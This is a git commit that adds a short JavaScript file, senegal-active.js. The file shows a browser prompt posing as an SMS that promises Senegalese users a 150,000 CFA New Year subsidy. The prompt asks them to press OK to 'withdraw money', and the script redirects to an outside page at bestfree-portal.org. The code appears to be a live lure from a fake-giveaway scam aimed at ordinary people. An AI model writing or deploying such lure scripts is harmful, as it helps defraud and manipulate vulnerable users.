ae30c61da1c5a04f8ae5cfc7ca6c72920f585a7c
ebeekpo <imohdavid078@gmail.com>
2024-12-30 08:53:30 +0100

    Create senegal-active.js

---
+++ senegal-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETRAIT 150 000 FCFA'
+password=prompt('SMS: Félicitations. Vous faites partie des Sénégalais sélectionnés pour recevoir une subvention du Nouvel An de 150 000 CFA, veuillez appuyer sur OK pour retirer de l'argent. ','RETRAIT 150 000 FCFA');
+if (password != 'RETRAIT 150 000 FCFA') {
+location.href='https://bestfree-portal.org/senegal-newyear.html';
+}
